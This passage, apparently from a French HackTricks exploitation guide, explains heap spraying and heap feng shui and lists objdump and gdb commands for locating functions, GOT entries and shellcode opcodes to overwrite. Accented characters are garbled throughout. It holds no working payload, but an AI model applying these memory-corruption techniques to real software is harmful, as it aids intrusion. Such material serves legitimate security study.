De plus, un correctif a √©t√© introduit pour le rendre encore plus compliqu√©.

**Heap Spraying**

Il s'agit essentiellement de r√©server autant de m√©moire que possible pour les tas et de les remplir avec un matelas de nops suivis d'une shellcode. De plus, 0x0c est utilis√© comme matelas. On essaiera de sauter √† l'adresse 0x0c0c0c0c, et ainsi, si une adresse √† laquelle on va appeler est √©cras√©e avec ce matelas, on sautera l√†-bas. Fondamentalement, la tactique consiste √† r√©server autant que possible pour voir si un pointeur est √©cras√© et √† sauter √† 0x0c0c0c0c en esp√©rant qu'il y ait des nops l√†-bas.

**Heap Feng Shui**

Consiste √† cimenter la m√©moire en r√©servant et en lib√©rant des morceaux de mani√®re √† ce qu'il reste des morceaux r√©serv√©s entre des morceaux libres. Le tampon √† d√©border sera plac√© dans l'un des espaces vides.

**objdump -d executable** ‚Äî> D√©sassembler les fonctions\
**objdump -d ./PROGRAMME | grep FONCTION** ‚Äî> Obtenir l'adresse de la fonction\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Pour v√©rifier que c'est bien notre shellcode et obtenir les OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Table des symboles, pour obtenir l'adresse des variables et fonctions\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Pour obtenir l'adresse des fonctions de biblioth√®que (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Obtient l'adresse de puts √† √©craser dans le GOT\
**objdump -D ./exec** ‚Äî> D√©sassembler TOUT jusqu'aux entr√©es de la plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Info de la fonction en gdb

## Cours int√©ressants

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **R√©f√©rences**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ le [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
